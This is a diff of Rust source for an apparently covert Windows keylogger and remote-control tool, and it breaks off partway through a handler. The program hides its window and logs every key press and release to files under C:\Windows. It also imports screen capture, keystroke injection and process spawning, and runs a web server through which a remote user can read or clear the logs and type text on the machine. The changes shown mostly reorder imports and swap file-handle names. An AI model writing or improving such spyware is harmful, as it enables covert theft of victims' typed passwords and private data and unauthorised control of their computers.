@@ -1,25 +1,13 @@
 #![windows_subsystem = "windows"]
 
-use axum::{
-    Form, Router,
-    extract::ws::{Message, WebSocketUpgrade},
-    response::Html,
-    routing::{get, post},
-};
-use device_query::{DeviceEvents, DeviceEventsHandler};
-use enigo::{Enigo, Keyboard, Settings};
 use rdev::listen;
 use serde::Deserialize;
-use std::{
-    env::args,
-    io::Cursor,
-    sync::{Arc, Mutex},
-    time::Duration,
-};
-use std::fs::OpenOptions;
-use std::io::{Read, Seek, SeekFrom, Write};
-use tokio::{net::TcpListener, process::Command, spawn};
+use enigo::{Keyboard, Enigo, Settings};
 use xcap::{Monitor, image::ImageFormat};
+use device_query::{DeviceEvents, DeviceEventsHandler};
+use tokio::{net::TcpListener, process::Command, time::Duration};
+use std::{env::args, fs::OpenOptions, sync::{Arc, Mutex}, io::{Seek, Read, Write, Cursor, SeekFrom}};
+use axum::{Form, Router, extract::ws::{Message, WebSocketUpgrade}, response::Html, routing::{get, post}};
 
 #[derive(Deserialize)]
 struct Frm {
@@ -32,32 +20,32 @@ async fn main() {
     let mut arg = args();
     arg.next();
 
-    let lock = Arc::new(Mutex::new(OpenOptions::new().read(true).write(true).create(true).open("C:\\Windows\\full.log").unwrap()));
+    let lock = Arc::new(Mutex::new(OpenOptions::new().read(true).write(true).create(true).open("C:\\Windows\\opt.log").unwrap()));
     let lock1 = lock.clone();
     let lock2 = lock.clone();
-    let lock3 = lock.clone();
 
-    let lck = Arc::new(Mutex::new(OpenOptions::new().read(true).write(true).create(true).open("C:\\Windows\\opt.log").unwrap()));
+    let lck = Arc::new(Mutex::new(OpenOptions::new().read(true).write(true).create(true).open("C:\\Windows\\full.log").unwrap()));
     let lck1 = lck.clone();
     let lck2 = lck.clone();
+    let lck3 = lck.clone();
 
     let handler = DeviceEventsHandler::new(Duration::ZERO).unwrap();
     let enigo = Arc::new(Mutex::new(Enigo::new(&Settings::default()).unwrap()));
 
     let _down = handler.on_key_down(move |key| {
-        let mut f = lock2.lock().unwrap();
+        let mut f = lck2.lock().unwrap();
         f.seek(SeekFrom::End(0)).unwrap();
         f.write((key.to_string() + "&#x2193; ").as_bytes()).unwrap();
     });
     let _up = handler.on_key_up(move |key| {
-        let mut f = lock3.lock().unwrap();
+        let mut f = lck3.lock().unwrap();
         f.seek(SeekFrom::End(0)).unwrap();
         f.write((key.to_string() + "&#x2191; ").as_bytes()).unwrap();
     });
 
-    spawn(async move {
+    tokio::spawn(async move {
         loop {
-            let l = lck2.clone();
+            let l = lock2.clone();
             listen(move |e| {
                 if let Some(name) = e.name {
                     let mut f = l.lock().unwrap();
@@ -95,21 +83,20 @@ async fn main() {
                         "rdev" => (), // TODO: rdev
                         "txt" => enigo.lock().unwrap().text(&text).unwrap(),
                         "clr" => {
-                            let mut f = lock.lock().unwrap();
-                            let mut g = lck.lock().unwrap();
+                            let mut f = lck.lock().unwrap();
+                            let mut g = lock.lock().unwrap();
                             f.set_len(0).unwrap();
                             g.set_len(0).unwrap();
                             f.seek(SeekFrom::Start(0)).unwrap();
                             g.seek(SeekFrom::Start(0)).unwrap();
-
                         }
                         _ => (),
                     }
                     Html("<script>window.location.href=''</script>")
                 })
                 .get(async move || {
-                    let mut f = lock1.lock().unwrap();
-                    let mut g = lck1.lock().unwrap();
+                    let mut f = lck1.lock().unwrap();
+                    let mut g = lock1.lock().unwrap();
                     f.seek(SeekFrom::Start(0)).unwrap();
                     g.seek(SeekFrom::Start(0)).unwrap();
                     let mut s = String::new();
